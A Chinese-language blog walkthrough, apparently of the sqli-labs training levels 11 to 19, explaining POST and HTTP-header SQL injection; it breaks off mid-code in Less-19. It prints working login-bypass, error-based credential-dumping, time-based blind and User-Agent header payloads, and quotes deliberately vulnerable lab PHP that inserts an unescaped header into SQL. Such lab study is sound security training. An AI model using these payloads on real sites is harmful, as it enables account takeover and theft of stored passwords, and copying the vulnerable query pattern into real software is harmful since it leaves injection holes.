<h3 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200815110054227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200815162943149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用万能密码时可以登录<br><code>admin&#39; or 1 #)</code><br>是一个dump用户，当然admin也可以登录<br><img src="https://img-blog.csdnimg.cn/20200815163032529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这儿是有回显的注入<br>我们试试喽~<br>POST<br><img src="https://img-blog.csdnimg.cn/20200815163556929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现只有2成立，3就不能正常了<br><img src="https://img-blog.csdnimg.cn/20200815164012775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现回显12<br><img src="https://img-blog.csdnimg.cn/20200815164428328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们正常查询即可<del>~</del></p>
<p><strong>报错注入</strong><br><code>uname=-admin&#39; and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</code></p>
<h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200815164817367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现闭合喽</p>
<p><img src="https://img-blog.csdnimg.cn/20200815165024938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其余同less11</p>
<h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200815170014796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>单引号报错，发现可以闭合，<code>&#39;)</code><br>因为我们登陆成功时并没有发现任何回显，<br><img src="https://img-blog.csdnimg.cn/2020081517035495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>我们可以进行报错注入，<br><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select database())))  --+</code><br>报错注入讲解，见另外一篇sql基础总结<br><img src="https://img-blog.csdnimg.cn/20200815171312110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h4 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h4><p>我们使用基于时间的盲注，同1-10关的，只是在burp里修改即可</p>
<h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200815173533392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>本地延迟比较高，我们时间使用多一点，因为她没有回显，只能用盲注了<br><strong>方法2</strong><br>报错注入<br><code>uname=uname=admin&quot; and extractvalue(1,concat(0x7e,(select database())))--+</code><br><img src="https://img-blog.csdnimg.cn/20200815173848176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)"></a>less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</h3><p><img src="https://img-blog.csdnimg.cn/20200819005644744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们接着尝试万能密码<br><code>123&#39; or 1 #</code><br>登录成功说明他是单引号闭合<br>我们使用admin’ and  sleep(10) # 基于时间的盲注，其他的话就是用if喽，跟上面情况一致</p>
<p><img src="https://img-blog.csdnimg.cn/20200819010112827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><a href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)"></a>Less-16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</h3><p>与15关相同关闭了报错提示，但可以根据页面的回显来判断。</p>
<p>当测试到admin”) #时页面显示登陆成功，所以闭合方式为双引号括号”)，如果不知道用户名可以这样测试， <code>123&quot;) or 1 #</code></p>
<p>本关依旧是可以进行布尔盲注和时间盲注。</p>
<h3 id="Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200820074013631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里是修改密码的页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname&#x3D;check_input($_POST[&#39;uname&#39;]);  </span><br><span class="line"></span><br><span class="line">$passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br></pre></td></tr></table></figure>
<p>我们可以看到，用户名被check_input 包裹了，<br>而密码没有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是他的检查函数<br>传入的值首先只会提取，前15 位</p>
<ul>
<li><code>get_magic_quotes_gpc</code> — 获取当前 magic_quotes_gpc 的配置选项设置</li>
</ul>
<p>如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE。<code>magic_quotes_gpc</code>开启时用于在预定义字符（单引号、双引号、斜杠、NULL）前加上反斜杠，</p>
<p>5.4.0 始终返回 FALSE，因为这个魔术引号功能已经从 PHP 中移除了。</p>
<h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">function check_input($value)</span><br><span class="line">    &#123;</span><br><span class="line">    if(!empty($value))</span><br><span class="line">        &#123;</span><br><span class="line">        &#x2F;&#x2F; truncation (see comments)</span><br><span class="line">        $value &#x3D; substr($value,0,20);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Stripslashes if magic quotes enabled</span><br><span class="line">        if (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Quote if not a number</span><br><span class="line">        if (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">        $value &#x3D; intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">    $IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your IP ADDRESS is: &#39; .$IP;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#x2F;&#x2F;echo &#39;Your User Agent is: &#39; .$uagent;</span><br><span class="line">&#x2F;&#x2F; take the variables</span><br><span class="line">if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">    $passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br><span class="line">    </span><br><span class="line">    &#x2F;*</span><br><span class="line">    echo &#39;Your Your User name:&#39;. $uname;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your Password:&#39;. $passwd;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your User Agent String:&#39;. $uagent;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your User Agent String:&#39;. $IP;</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;logging the connection parameters to a file for analysis.    </span><br><span class="line">    $fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);</span><br><span class="line">    fwrite($fp,&#39;User Agent:&#39;.$uname.&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 &#x3D; mysql_query($sql);</span><br><span class="line">    $row1 &#x3D; mysql_fetch_array($result1);</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;</span><br><span class="line">            $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            &#x2F;&#x2F;echo &#39;Your IP ADDRESS is: &#39; .$IP;</span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">            &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size &#x3D; 3 &gt;&#39;;            </span><br><span class="line">            echo &#39;Your User Agent is: &#39; .$uagent;</span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot;  &#x2F;&gt;&#39;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        else</span><br><span class="line">            &#123;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;</span><br><span class="line">            &#x2F;&#x2F;echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;&quot;;            </span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;   &#x2F;&gt;&#39;;    </span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20201004172204602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>打开发现存在ip的回显，可能就是user-agent存在注入吧，我们查看代码<br><img src="https://img-blog.csdnimg.cn/20201004172434860.png#pic_center" alt="在这里插入图片描述"><br>我们发现，它本身过滤的很好，但是在uagent的地方，直接进行了获取，直接进行了输出<br><img src="https://img-blog.csdnimg.cn/20201004173035631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>同时进行了数据库的写入，<br>发现是单引号的闭合<br><img src="https://img-blog.csdnimg.cn/20201004184205222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们burp试试看，登录成功后，果然是UA可以进行注入，并回显</p>
<p>发现并没有我们想要的结果，那么我们尝试报错注入<br><code>1&#39;,1,extractvalue(1,concat(0x7e,(database()),0x7e)))#</code><br><img src="https://img-blog.csdnimg.cn/20201004204040457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将后面注释，同时闭合，然后执行我们的报错</p>
<h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h3><p><img src="https://img-blog.csdnimg.cn/2020100420425598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>和上面比较相似，只不过是在referer处的回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">function check_input($value)</span><br><span class="line">    &#123;</span><br><span class="line">    if(!empty($value))</span><br><span class="line">        &#123;</span><br><span class="line">        &#x2F;&#x2F; truncation (see comments)</span><br><span class="line">        $value &#x3D; substr($value,0,20);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Stripslashes if magic quotes enabled</span><br><span class="line">        if (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Quote if not a number</span><br><span class="line">        if (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">        $value &#x3D; intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">    $IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your IP ADDRESS is: &#39; .$IP;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#x2F;&#x2F;echo &#39;Your User Agent is: &#39; .$uagent;</span><br><span class="line">&#x2F;&#x2F; take the variables</span><br><span class="line">if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">    $passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br><span class="line">    </span><br><span class="line">    &#x2F;*</span><br><span class="line">    echo &#39;Your Your User name:&#39;. $uname;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your Password:&#39;. $passwd;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your User Agent String:&#39;. $uagent;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &#39;Your User Agent String:&#39;. $IP;</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;logging the connection parameters to a file for analysis.    </span><br><span class="line">    $fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);</span><br><span class="line">    fwrite($fp,&#39;Referer:&#39;.$uname.&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 &#x3D; mysql_query($sql);</span><br><span class="line">    $row1 &#x3D; mysql_fetch_array($result1);</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;</span><br><span class="line">            $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;referers&#96; (&#96;referer&#96;, &#96;ip_address&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            &#x2F;&#x2F;echo &#39;Your IP ADDRESS is: &#39; .$IP;</span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">            &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo 